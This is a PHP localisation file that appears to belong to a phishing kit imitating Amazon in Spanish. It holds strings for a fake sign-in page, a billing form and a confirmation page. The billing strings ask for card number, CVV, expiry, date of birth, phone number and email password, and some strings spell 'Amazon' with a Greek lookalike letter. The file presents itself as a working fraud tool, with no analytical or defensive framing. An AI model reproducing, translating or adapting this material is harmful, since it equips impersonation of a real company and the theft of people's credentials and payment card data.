<?php
$m3il9a_1 = 'Prueba Prime';
$m3il9a_2 = 'Todos los departamentos';
$m3il9a_3 = 'Seleccione el departamento en el que desea buscar';
$m3il9a_4 = 'ES';
$m3il9a_5 = 'Hola. Identifícate';
$m3il9a_6 = 'Cuenta y listas';
$m3il9a_7 = 'Pedidos';
$m3il9a_8 = 'Cesta';

$zab_a = 'Su cuenta';
$zab_b = 'Amazon Wallet';
$zab_c = 'Mi cuenta';
$Azzouz1 = 'Amazon acepta todas las principales tarjetas de crédito y débito';
$Azzouz2 = 'Tarjetas de crédito o débito';
$Azzouz3 = 'Nombre en la tarjeta';
$Azzouz4 = 'Dirección de correo electrónico';
$Azzouz5 = 'Contraseña';
$Azzouz6 = 'Confirmar contraseña';
$Azzouz7 = 'Ingrese su acceso de correo electrónico adjunto';
$Azzouz8 = 'Usar esta tarjeta en toda Amazon';
$year = date('Y');
//////////////////////////////////////////////////////////////////////////
$dexter_zkika_1 = "Iniciar sesión";
$dexter_zkika_2 = "Email (teléfono para cuentas móviles)";
$dexter_zkika_3 = "Olvidó su contraseña?";
$dexter_zkika_4 = "Contraseña";
$dexter_zkika_5 = "Iniciar sesión";
$dexter_zkika_6 = "Nuevo en Αmazon?";
$dexter_zkika_11 = "Al iniciar sesión usted está de acuerdo con nuestro";
$dexter_zkika_111 = "Condiciones de Uso y Venta";
$dexter_zkika_1111 = "y nuestro";
$dexter_zkika_11111 = "Aviso de privacidad";
$dexter_zkika_12 = "Crear una cuenta";
$dexter_zkika_13 = "Condiciones de Uso";
$dexter_zkika_15 = "Aviso de Privacidad";
$dexter_zkika_16 = "Ayuda";
$goverment_is_bad_1 = "© 1996- $year, Αmazon.com, Inc. o sus afiliados";
$goverment_is_bad_2 = "Amazon - Iniciar sesión";
///////////////////////// facturación //////////////////////// ///////////
$richard_azzouz_1 = "Amazon - Facturación";
$richard_azzouz_2 = "Hola.";
$richard_azzouz_3 = "Buscar";
$richard_azzouz_4 = "Todos";
$richard_azzouz_5 = "Su cuenta";
$richard_azzouz_6 = "Tarjeta";
$richard_azzouz_7 = "Deseo";
$richard_azzouz_8 = "lista";
$goverment_is_bad_4 = "Ingrese la información de su tarjeta de crédito";
$goverment_is_bad_5 = "Cuando haya terminado, haga clic en el botón Enviar.";
$goverment_is_bad_6 = "Titular de la tarjeta";
$goverment_is_bad_7 = "Número de tarjeta";
$goverment_is_bad_8 = "Sin trazos ni espacios";
$goverment_is_bad_09 = "Código de seguridad de la tarjeta.";
$goverment_is_bad_10 = "Fecha de vencimiento";
$goverment_is_bad_11 = "Mes";
$goverment_is_bad_12 = "Año";
$goverment_is_bad_13 = "Día";
$goverment_is_bad_14 = "Número de teléfono";
$goverment_is_bad_15 = "Código postal";
$goverment_is_bad_16 = "fecha de nacimiento";
$goverment_is_bad_17 = "CVV";
$goverment_is_bad_18 = "Enviar";
$goverment_is_bad_19 = "Condiciones de Uso";
$goverment_is_bad_20 = "Aviso de privacidad";
$goverment_is_bad_21 = "Anuncios basados ​​en intereses";
/////////////////////////// finich ////////////////////// ////////////////////////////
$zkika_logo = "Amazon - Gracias!";
$dexter_zkikab_1 = "Gracias";
$dexter_zkikab_2 = "Ha confirmado con éxito la <br> Información de su cuenta";
$dexter_zkikab_3 = "Tu tienes que volver a ingresar para guardar los cambios, serás redirigido automáticamente a la página de inicio de sesión En 5 segundos <br> Gracias por usar la verificación de nuestro sistema.";
////////////////////////////////////////////////// ////////////////////////////////////
?>